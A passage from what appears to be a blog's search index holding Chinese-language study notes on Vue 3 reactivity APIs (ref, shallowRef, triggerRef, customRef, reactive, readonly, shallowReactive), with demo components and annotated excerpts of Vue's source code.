<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123;person&#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;button @click=&quot;change&quot;&gt;修改&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, isRef &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const person = ref(&#123; name: &quot;yajue&quot; &#125;)</span><br><span class="line">    </span><br><span class="line">const person2 = &#123; name: &quot;pinky&quot; &#125;</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  // 判断对象是不是ref对象</span><br><span class="line">  // 实际生产中用得不多，但源码里用得很多</span><br><span class="line">  console.log(isRef(person))	// -&gt; true</span><br><span class="line">  console.log(isRef(person2))	// -&gt; false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="shallowRef"><a href="#shallowRef" class="headerlink" title="shallowRef"></a>shallowRef</h1><p>创建一个跟踪<code>.value</code>变化的ref，但它的值不会变成响应式（浅层响应式）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;ref: &#123;&#123;person&#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;div&gt;shallowRef: &#123;&#123;person2&#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;button @click=&quot;change&quot;&gt;修改&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, shallowRef &#125; from &quot;vue&quot;</span><br><span class="line">    </span><br><span class="line">type P = &#123;</span><br><span class="line">  name: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const person = ref(&#123; name: &quot;yajue&quot; &#125;)</span><br><span class="line"></span><br><span class="line">// shallowRef 作浅层响应式</span><br><span class="line">const person2 = shallowRef(&#123; name: &quot;MUR&quot; &#125;)</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  // 点击后数据改变，但视图不会变化，因为它是浅层响应式</span><br><span class="line">  // person2.value.name = &quot;三浦&quot;</span><br><span class="line">    </span><br><span class="line">  // 直接从value赋值才会变成响应式</span><br><span class="line">  // person2.value = &#123;</span><br><span class="line">  //   name: &quot;三浦&quot;</span><br><span class="line">  // &#125;</span><br><span class="line">    </span><br><span class="line">  // ref和shallowRef不能同时写，因为会影响shallowRef，造成视图的更新</span><br><span class="line">  person.value.name = &quot;我是ref&quot;</span><br><span class="line">  person2.value.name = &quot;我是shallowRef&quot;</span><br><span class="line">  console.log(person2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="triggerRef"><a href="#triggerRef" class="headerlink" title="triggerRef"></a>triggerRef</h1><p>强制页面视图更新。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;ref: &#123;&#123;person&#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;div&gt;shallowRef: &#123;&#123;person2&#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;button @click=&quot;change&quot;&gt;修改&lt;/button&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, shallowRef, triggerRef &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const person = ref(&#123; name: &quot;yajue&quot; &#125;)</span><br><span class="line"></span><br><span class="line">const person2 = shallowRef(&#123; name: &quot;MUR&quot; &#125;)</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  person2.value.name = &quot;我被影响了&quot;</span><br><span class="line">  // triggerRef强制更新收集的依赖，直接调用它也能更新shallowRef</span><br><span class="line">  // ref底层更新视图的逻辑中会调用triggerRef函数，所以ref和shallowRef不能同时写在一起</span><br><span class="line">  triggerRef(person2)</span><br><span class="line">  console.log(person2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="customRef"><a href="#customRef" class="headerlink" title="customRef"></a>customRef</h1><p>自定义ref。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123;obj&#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;button @click=&quot;change&quot;&gt;修改&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, shallowRef, triggerRef, customRef &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">// 自定义ref，要求返回一个customRef的返回值</span><br><span class="line">function myRef&lt;T&gt;(value: T) &#123;</span><br><span class="line">  // customRef接收一个回调函数，回调函数接收两个参数</span><br><span class="line">  return customRef((track, trigger)=&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    // 可以使用自定义ref实现额外的逻辑</span><br><span class="line">    let timer</span><br><span class="line">      </span><br><span class="line">    // 回调函数要求返回一个对象，对象需要实现get和set方法</span><br><span class="line">    return &#123;</span><br><span class="line">      get() &#123;</span><br><span class="line">        // track用来收集依赖</span><br><span class="line">        track()</span><br><span class="line">        return value</span><br><span class="line">      &#125;,</span><br><span class="line">      set(newVal) &#123;</span><br><span class="line">        //比如用户输入值时，调用接口并做个防抖</span><br><span class="line">        clearTimeout(timer)</span><br><span class="line">        setTimeout(()=&gt; &#123;</span><br><span class="line">          console.log(&quot;我调用了一个接口&quot;)</span><br><span class="line">          value = newVal</span><br><span class="line">          timer = null</span><br><span class="line">          // trigger用来触发依赖更新</span><br><span class="line">          trigger()</span><br><span class="line">        &#125;, 500)</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">const obj = myRef&lt;string&gt;(&quot;cheriko&quot;)</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  obj.value = &quot;meruko&quot;</span><br><span class="line">  console.log(obj)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/reactivity/src/ref.ts</code>）中可以看到ref的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Takes an inner value and returns a reactive and mutable ref object, which</span></span><br><span class="line"><span class="comment"> * has a single property `.value` that points to the inner value.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> <span class="variable">value</span> - The object to wrap in the ref.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> &#123;<span class="type">@link https://vuejs.org/api/reactivity-core.html#ref</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 进行函数重载，支持多种传入的类型</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> ref&lt;T <span class="keyword">extends</span> <span class="title class_">Ref</span>&gt;(<span class="attr">value</span>: T): T</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> ref&lt;T&gt;(<span class="attr">value</span>: T): <span class="title class_">Ref</span>&lt;<span class="title class_">UnwrapRef</span>&lt;T&gt;&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> ref&lt;T = <span class="built_in">any</span>&gt;(): <span class="title class_">Ref</span>&lt;T | <span class="literal">undefined</span>&gt;</span><br><span class="line"><span class="comment">// value就是程序员传进ref的值</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ref</span>(<span class="params">value?: <span class="built_in">unknown</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">createRef</span>(value, <span class="literal">false</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> shallowRef&lt;T <span class="keyword">extends</span> <span class="built_in">object</span>&gt;(</span><br><span class="line">  <span class="attr">value</span>: T</span><br><span class="line">): T <span class="keyword">extends</span> <span class="title class_">Ref</span> ? T : <span class="title class_">ShallowRef</span>&lt;T&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> shallowRef&lt;T&gt;(<span class="attr">value</span>: T): <span class="title class_">ShallowRef</span>&lt;T&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> shallowRef&lt;T = <span class="built_in">any</span>&gt;(): <span class="title class_">ShallowRef</span>&lt;T | <span class="literal">undefined</span>&gt;</span><br><span class="line"><span class="comment">// shallowRef，和ref的不同就是它把__v_isShallow设为true，所以它的响应只到.value</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">shallowRef</span>(<span class="params">value?: <span class="built_in">unknown</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">createRef</span>(value, <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createRef</span>(<span class="params">rawValue: <span class="built_in">unknown</span>, shallow: <span class="built_in">boolean</span></span>) &#123;</span><br><span class="line">  <span class="comment">// 判断传进的值，如果已经是ref对象就不用再变了</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isRef</span>(rawValue)) &#123;</span><br><span class="line">    <span class="keyword">return</span> rawValue</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 创建ref对象</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RefImpl</span>(rawValue, shallow)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RefImpl</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="comment">// 这个_value就是真正要读取的东西</span></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_value</span>: T</span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_rawValue</span>: T</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> dep?: <span class="title class_">Dep</span> = <span class="literal">undefined</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">readonly</span> __v_isRef = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构造函数</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">value: T, <span class="keyword">public</span> <span class="keyword">readonly</span> __v_isShallow: <span class="built_in">boolean</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_rawValue</span> = __v_isShallow ? value : <span class="title function_">toRaw</span>(value)</span><br><span class="line">    <span class="comment">// 判断isShallow，如果为true就赋值value，为false就赋值toReactive(value)</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_value</span> = __v_isShallow ? value : <span class="title function_">toReactive</span>(value)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">value</span>() &#123;</span><br><span class="line">    <span class="comment">// 进行依赖收集</span></span><br><span class="line">    <span class="title function_">trackRefValue</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="comment">// 读取的是_value</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_value</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">set</span> <span class="title function_">value</span>(<span class="params">newVal</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> useDirectValue =</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">__v_isShallow</span> || <span class="title function_">isShallow</span>(newVal) || <span class="title function_">isReadonly</span>(newVal)</span><br><span class="line">    newVal = useDirectValue ? newVal : <span class="title function_">toRaw</span>(newVal)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">hasChanged</span>(newVal, <span class="variable language_">this</span>.<span class="property">_rawValue</span>)) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">_rawValue</span> = newVal</span><br><span class="line">      <span class="comment">// 修改的也是_value</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">_value</span> = useDirectValue ? newVal : <span class="title function_">toReactive</span>(newVal)</span><br><span class="line">      <span class="comment">// 进行依赖更新</span></span><br><span class="line">      <span class="title function_">triggerRefValue</span>(<span class="variable language_">this</span>, newVal)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// triggerRef，可以强制更新shallowRef的值</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">triggerRef</span>(<span class="params">ref: Ref</span>) &#123;</span><br><span class="line">  <span class="title function_">triggerRefValue</span>(ref, __DEV__ ? ref.<span class="property">value</span> : <span class="built_in">void</span> <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// triggerRefValue会接着调用triggerEffects，它会进行依赖的更新</span></span><br></pre></td></tr></table></figure>

<p>这里属于reactive的源码，位于<code>/package/reactivity/src/reactive.ts</code>。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns a reactive proxy of the given value (if possible).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If the given value is not an object, the original value itself is returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> <span class="variable">value</span> - The value for which a reactive proxy shall be created.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 判断传入的value是否为引用类型（数组或对象），是则调用reactive，否则返回value本身</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> toReactive = &lt;T <span class="keyword">extends</span> <span class="built_in">unknown</span>&gt;(<span class="attr">value</span>: T): <span class="function"><span class="params">T</span> =&gt;</span></span><br><span class="line">  <span class="title function_">isObject</span>(value) ? <span class="title function_">reactive</span>(value) : value</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Reactive全家桶</title>
    <url>/web/study/Vue/7.Reactive%E5%85%A8%E5%AE%B6%E6%A1%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="reactive"><a href="#reactive" class="headerlink" title="reactive"></a>reactive</h1><p>reactive和ref的区别：</p>
<ul>
<li>ref支持传入所有类型，reactive只支持引用类型（Array、Object、Map、Set、WeakSet、WeakMap等）</li>
<li>ref取值和赋值都要加.value，reactive不需要</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">      &lt;input v-model=&quot;form.name&quot; type=&quot;text&quot;&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;input v-model=&quot;form.age&quot; type=&quot;text&quot;&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      &lt;button @click.prevent=&quot;submit&quot;&gt;提交&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;  </span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- --------------------------------------------------------- --&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li v-for=&quot;(item, index) in list&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;</span><br><span class="line">      &lt;!-- &lt;li v-for=&quot;(item, index) in list.arr&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt; --&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;button @click=&quot;add&quot;&gt;&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive &#125; from &quot;vue&quot;</span><br><span class="line">    </span><br><span class="line">type P = &#123;</span><br><span class="line">  name: string;</span><br><span class="line">  age: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 只支持引用类型的参数，用基本类型就报错</span><br><span class="line">// let form = reactive(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">// 和ref一样可以进行类型推断，也可以自己定义</span><br><span class="line">// let form = reactive&lt;P&gt;(&#123;</span><br><span class="line">//   name: &quot;yajue&quot;,</span><br><span class="line">//   age: 24</span><br><span class="line">// &#125;)</span><br><span class="line">    </span><br><span class="line">let form = reactive(&#123;</span><br><span class="line">  name: &quot;yajue&quot;,</span><br><span class="line">  age: 24</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 不需要.value</span><br><span class="line">// form.age = 114514</span><br><span class="line">    </span><br><span class="line">const submit = ()=&gt; &#123;</span><br><span class="line">  console.log(form)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// --------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">// reactive是proxy代理的对象，直接赋值会覆盖掉它</span><br><span class="line">let list = reactive&lt;string[]&gt;([])</span><br><span class="line"></span><br><span class="line">// let list = reactive&lt;&#123;</span><br><span class="line">//   arr: string[]</span><br><span class="line">// &#125;&gt;(&#123;</span><br><span class="line">//   arr: []</span><br><span class="line">// &#125;)</span><br><span class="line"></span><br><span class="line">const add = ()=&gt; &#123;</span><br><span class="line">  // 假设它是接口返回的数据</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">    let res = [&quot;www&quot;, &quot;草&quot;, &quot;kusa&quot;]</span><br><span class="line">    // 会破坏响应式对象，不能直接赋值</span><br><span class="line">    // list = res</span><br><span class="line"></span><br><span class="line">    // 解决方案1：可以用数组方法</span><br><span class="line">    list.push(...res)</span><br><span class="line"></span><br><span class="line">    // 解决方案2：把数组作为一个对象属性，并把对象赋给reactive</span><br><span class="line">    // list.arr = res</span><br><span class="line"></span><br><span class="line">    console.log(list)</span><br><span class="line">  &#125;, 2000)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="readonly"><a href="#readonly" class="headerlink" title="readonly"></a>readonly</h1><p>拷贝一份proxy对象，并将其设为只读。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;show&quot;&gt;&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive, readonly &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">let form = reactive(&#123;</span><br><span class="line">  name: &quot;yajue&quot;,</span><br><span class="line">  age: 24</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 把reactive所有属性变成只读</span><br><span class="line">// 实际生产中用得不多，但源码里用得很多</span><br><span class="line">const read = readonly(form)</span><br><span class="line"></span><br><span class="line">const show = ()=&gt; &#123;</span><br><span class="line">  // 会报错，因为read是只读的</span><br><span class="line">  // read.name = &quot;野兽&quot;</span><br><span class="line">  // console.log(form, read)    // -&gt; &#123;name:&quot;yajue&quot;,age:24&#125;, &#123;name:&quot;yajue&quot;,age:24&#125;</span><br><span class="line"></span><br><span class="line">  // 不会报错，因为form不是只读的</span><br><span class="line">  // read会受原始对象影响</span><br><span class="line">  form.name = &quot;野兽&quot;</span><br><span class="line">  console.log(form, read)   // -&gt; &#123;name:&quot;野兽&quot;,age:24&#125;, &#123;name:&quot;野兽&quot;,age:24&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="shallowReactive"><a href="#shallowReactive" class="headerlink" title="shallowReactive"></a>shallowReactive</h1><p>只有浅层的数据（第一层）才会变成响应式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div&gt;reactive: &#123;&#123; form &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;shallowReactive: &#123;&#123; obj &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;button @click=&quot;edit&quot;&gt;&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; reactive, readonly, shallowReactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">let form = reactive(&#123;</span><br><span class="line">  name: &quot;yajue&quot;,</span><br><span class="line">  age: 24</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// shallowReactive 作浅层响应式</span><br><span class="line">const obj = shallowReactive&lt;any&gt;(&#123;</span><br><span class="line">  foo: &#123;</span><br><span class="line">    bar: &#123;</span><br><span class="line">      num: 114514</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const edit = ()=&gt; &#123;</span><br><span class="line">  // 改变第一层的属性可以响应</span><br><span class="line">  // obj.foo = &#123; num = 1919810 &#125;</span><br><span class="line"></span><br><span class="line">  // 改变深层嵌套的属性就不会引起视图的更新</span><br><span class="line">  // obj.foo.bar.num = 1919810</span><br><span class="line">  // console.log(obj)</span><br><span class="line"></span><br><span class="line">  // 和ref&amp;shallowRef一样，reactive和shallowReactive同时写也会出现问题</span><br><span class="line">  form.name = &quot;野兽&quot;</span><br><span class="line">  obj.foo.bar.num = 1919810</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/reactivity/src/reactive.ts</code>）中可以看到reactive的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// reactive使用了泛型约束，只支持引用类型的参数，所以用基本类型就报错</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> reactive&lt;T <span class="keyword">extends</span> <span class="built_in">object</span>&gt;(<span class="attr">target</span>: T): <span class="title class_">UnwrapNestedRefs</span>&lt;T&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">reactive</span>(<span class="params">target: <span class="built_in">object</span></span>) &#123;</span><br><span class="line">  <span class="comment">// if trying to observe a readonly proxy, return the readonly version.</span></span><br><span class="line">  <span class="comment">// 如果对象是只读的，就直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isReadonly</span>(target)) &#123;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 否则调用createReactiveObject</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">createReactiveObject</span>(</span><br><span class="line">    target,</span><br><span class="line">    <span class="literal">false</span>,		<span class="comment">// isReadonly</span></span><br><span class="line">    mutableHandlers,		<span class="comment">// 用于给Array类型创建proxy</span></span><br><span class="line">    mutableCollectionHandlers,		<span class="comment">// 用于给Set Map WeakSet WeakMap类型创建proxy</span></span><br><span class="line">    reactiveMap</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createReactiveObject</span>(<span class="params"></span></span><br><span class="line"><span class="params">  target: Target,</span></span><br><span class="line"><span class="params">  isReadonly: <span class="built_in">boolean</span>,</span></span><br><span class="line"><span class="params">  baseHandlers: ProxyHandler&lt;<span class="built_in">any</span>&gt;,</span></span><br><span class="line"><span class="params">  collectionHandlers: ProxyHandler&lt;<span class="built_in">any</span>&gt;,</span></span><br><span class="line"><span class="params">  proxyMap: <span class="built_in">WeakMap</span>&lt;Target, <span class="built_in">any</span>&gt;</span></span><br><span class="line"><span class="params">  <span class="comment">// WeakMap（弱映射），主要实现值与对象的关联而不导致内存泄漏</span></span></span><br><span class="line"><span class="params">  <span class="comment">// WeakMap的键只能是Object类型的数据（null除外），且WeakMap的键名所指的对象不计入垃圾回收机制</span></span></span><br><span class="line"><span class="params">  <span class="comment">// WeakMap的值可以是任意的</span></span></span><br><span class="line"><span class="params">  <span class="comment">// 它的键名所引用的对象都是弱引用，即垃圾回收机制不将该引用考虑在内</span></span></span><br><span class="line"><span class="params">  <span class="comment">// 因此，只要所引用的对象的其他引用都被清除，垃圾回收机制就会释放该对象所占的内存</span></span></span><br><span class="line"><span class="params">  <span class="comment">// 即，一旦不再需要，WeakMap里的键名对象和所对应的键值对会自动删除，不用手动删除引用</span></span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 如果传入基本类型，报错</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isObject</span>(target)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`value cannot be made reactive: <span class="subst">$&#123;<span class="built_in">String</span>(target)&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// target is already a Proxy, return it.</span></span><br><span class="line">  <span class="comment">// exception: calling readonly() on a reactive object</span></span><br><span class="line">  <span class="comment">// 如果target已经被代理了，且程序员的目的不是将响应式对象变成只读，则直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    target[<span class="title class_">ReactiveFlags</span>.<span class="property">RAW</span>] &amp;&amp;</span><br><span class="line">    !(isReadonly &amp;&amp; target[<span class="title class_">ReactiveFlags</span>.<span class="property">IS_REACTIVE</span>])</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// target already has corresponding Proxy</span></span><br><span class="line">  <span class="comment">// 从缓存(readonlyMap, reactiveMap)中查找，如果已经被代理就直接返回</span></span><br><span class="line">  <span class="keyword">const</span> existingProxy = proxyMap.<span class="title function_">get</span>(target)</span><br><span class="line">  <span class="keyword">if</span> (existingProxy) &#123;</span><br><span class="line">    <span class="keyword">return</span> existingProxy</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// only specific value types can be observed.</span></span><br><span class="line">  <span class="comment">// 如果目标在白名单里直接返回，例如__skip__</span></span><br><span class="line">  <span class="comment">// 通过markRaw函数处理的数据会加上__skip__，即跳过代理</span></span><br><span class="line">  <span class="keyword">const</span> targetType = <span class="title function_">getTargetType</span>(target)</span><br><span class="line">  <span class="keyword">if</span> (targetType === <span class="title class_">TargetType</span>.<span class="property">INVALID</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//以上条件都没触发，开始做proxy代理</span></span><br><span class="line">  <span class="keyword">const</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(</span><br><span class="line">    target,</span><br><span class="line">    targetType === <span class="title class_">TargetType</span>.<span class="property">COLLECTION</span> ? collectionHandlers : baseHandlers</span><br><span class="line">  )</span><br><span class="line">  <span class="comment">// 缓存新代理后的对象</span></span><br><span class="line">  proxyMap.<span class="title function_">set</span>(target, proxy)</span><br><span class="line">  <span class="keyword">return</span> proxy</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
</search>
